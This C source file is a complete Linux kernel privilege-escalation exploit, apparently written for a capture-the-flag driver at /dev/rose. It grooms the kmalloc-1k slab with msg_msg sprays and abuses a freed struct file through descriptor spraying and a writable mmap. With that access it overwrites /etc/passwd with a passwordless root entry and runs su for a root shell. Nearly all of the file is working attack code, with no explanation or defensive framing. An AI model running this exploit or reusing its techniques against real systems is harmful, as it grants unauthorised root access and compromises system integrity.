#define _GNU_SOURCE
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <liburing.h>
#include <pthread.h>
#include <sys/capability.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <linux/capability.h>
#include <linux/types.h>
#include <liburing.h>
#include <poll.h>

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

typedef int8_t i8;
typedef int16_t i16;
typedef int32_t i32;
typedef int64_t i64;

#define PAGE_SIZE 0x1000
#define ARR_SIZE(arr) sizeof(arr) / sizeof(arr[0])

#define DEBUG
#ifdef DEBUG
#define errExit(msg)        \
    do                      \
    {                       \
        perror(msg);        \
        exit(EXIT_FAILURE); \
    } while (0)
#define WAIT()                \
    do                        \
    {                         \
        puts("[WAITING...]"); \
        getchar();            \
    } while (0)

#define logOK(msg, ...) dprintf(2, "[+] " msg "\n", ##__VA_ARGS__);
#define logInfo(msg, ...) dprintf(2, "[*] " msg "\n", ##__VA_ARGS__);
#define logErr(msg, ...) dprintf(2, "[!] " msg "\n", ##__VA_ARGS__);
#else
#define errExit(...) \
    do               \
    {                \
    } while (0)

#define WAIT(...) errExit(...)
#define logOK(...) errExit(...)
#define logInfo(...) errExit(...)
#define logErr(...) errExit(...)
#endif
u64 user_ip;
u64 user_cs;
u64 user_rflags;
u64 user_sp;
u64 user_ss;
void get_shell()
{
    if (getuid())
    {
        errExit("NO ROOT");
    }
    logOK("Rooted!");
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};
    execve(argv[0], argv, envp);
}
void save_state()
{
    __asm__(
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop qword ptr[rip+user_rflags];");
    user_ip = (u64)get_shell;
    logInfo("Saved user state");
}
/* ------------ Device stuff -------------*/

#define devfile "/dev/rose"

int opendev()
{
    int fd;
    if ((fd = open(devfile, O_RDONLY)) < 0)
    {
        errExit("opendev::open");
    }

    return fd;
}
/* ------------ END -------------*/

/* --------------  KMALLOC-1K    --------------*/

#define OBJS_PRE_SLAB 8
#define CPU_PARITAL 24

#define MSGMSG_HEADER_SIZE 0x30UL
#define DATALEN_MSG (PAGE_SIZE - MSGMSG_HEADER_SIZE)
#define TARGET_SIZE 0x400

struct msgmsg
{
    long mtype;
    char mtext[(MSGMSG_HEADER_SIZE + DATALEN_MSG) + TARGET_SIZE - 8]; //
};

struct msgmsg msg = {.mtype = 1};

int allocate_msgmsg(struct msgmsg *msg, int num)
{

    int qid = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
    for (int ix = 0; ix != num; ++ix)
    {
        if (msgsnd(qid, msg, sizeof(msg->mtext) - MSGMSG_HEADER_SIZE, 0) < 0)
            errExit("msgsnd");
    }
    return qid;
}

void free_msgmsg(int qid, struct msgmsg *msg)
{
    msgrcv(qid, msg, sizeof(*msg), msg->mtype, 0);
}

int overflow_objs[OBJS_PRE_SLAB * (CPU_PARITAL + 1)];
int pre_victim[OBJS_PRE_SLAB - 1];
int post_victim[OBJS_PRE_SLAB + 1];
/* --------------  END    --------------*/

char buf_page[PAGE_SIZE];

int main(int argc, char **argv, char **envp)
{
    logInfo("OK");
    system("echo -n AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA > /tmp/a");
    memset(buf_page, 'A', PAGE_SIZE);

    int fd1 = opendev();

    for (uint64_t i = 0; i < ARR_SIZE(overflow_objs); ++i)
    {
        if ((overflow_objs[i] = allocate_msgmsg(&msg, 1)) == -1)
            logErr("main::allocate_msgmsg at overflow_objs[%lu]", i);
    }

    for (uint64_t i = 0; i < ARR_SIZE(pre_victim); ++i)
    {
        if ((pre_victim[i] = allocate_msgmsg(&msg, 1)) == -1)
            logErr("main::allocate_msgmsg at pre_victim[%lu]", i);
    }

    int fd2 = opendev();

    for (uint64_t i = 0; i < ARR_SIZE(post_victim); ++i)
    {
        if ((post_victim[i] = allocate_msgmsg(&msg, 1)) == -1)
            logErr("main::allocate_msgmsg at post_victim[%lu]", i);
    }

    int pipes[16][2];
    for (size_t i = 0; i < ARR_SIZE(pipes); i++)
        pipe(pipes[i]);

    /*Clean slub*/
    for (uint64_t i = 0; i < ARR_SIZE(pre_victim); ++i)
    {
        free_msgmsg(pre_victim[i], &msg);
    }

    for (uint64_t i = 0; i < ARR_SIZE(post_victim); ++i)
    {
        free_msgmsg(post_victim[i], &msg);
    }

    for (uint64_t i = 0; i < ARR_SIZE(overflow_objs); ++i)
    {
        free_msgmsg(overflow_objs[i], &msg);
    }

    close(fd1);

    for (size_t i = 0; i < ARR_SIZE(pipes); i++)
    {
        if (write(pipes[i][1], buf_page, PAGE_SIZE) < 0)
            errExit("PageFaultEvent::write(pipe_fds)");
    }

    /*Free page*/
    for (size_t i = 0; i < ARR_SIZE(pipes); i++)
    {
        close(pipes[i][0]);
        close(pipes[i][1]);
    }

#define NUM_SPRAY_FDS 0x2a0
    logInfo("Spray FDs");
    int spray_fds[NUM_SPRAY_FDS];
    for (int i = 0; i < NUM_SPRAY_FDS; i++)
    {
        spray_fds[i] = open("/tmp/a", O_RDWR); // /tmp/a is a writable file
        if (spray_fds[i] == -1)
            errExit("Failed to open FDs");
    }
    usleep(10000);
    close(fd2);
    usleep(10000);
    logInfo("Find the freed FD using lseek");

    int spray_fds_2[NUM_SPRAY_FDS];
    for (int i = 0; i < NUM_SPRAY_FDS; i++)
    {
        spray_fds_2[i] = open("/tmp/a", O_RDWR);
        lseek(spray_fds_2[i], 0x8, SEEK_SET);
    }

    int freed_fd = -1;
    for (int i = 0; i < NUM_SPRAY_FDS; i++)
    {
        if (lseek(spray_fds[i], 0, SEEK_CUR) == 0x8)
        {
            freed_fd = spray_fds[i];
            lseek(freed_fd, 0x0, SEEK_SET);
            logOK("Found freed fd: %d", freed_fd);
            break;
        }
    }
    if (freed_fd == -1)
        errExit("Failed to find FD");

    char *file_mmap = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, freed_fd, 0);

    close(freed_fd);

    for (int i = 0; i < NUM_SPRAY_FDS; i++)
    {
        close(spray_fds_2[i]);
    }
    // After: 1 fd 0 refcount (Because new file)
    // Effect: FD in mmap (which is writeable) can be replaced with RDONLY file

    for (int i = 0; i < NUM_SPRAY_FDS; i++)
    {
        spray_fds[i] = open("/etc/passwd", O_RDONLY);
    }
    // After: 2 fd 1 refcount (but writeable due to mmap)

    strcpy(file_mmap, "root::0:0:root:/root:/bin/sh\n");

    logInfo("Done!");

    usleep(100);

    for (int i = 0; i < NUM_SPRAY_FDS; i++)
    {
        close(spray_fds[i]);
    }

    system("su");
}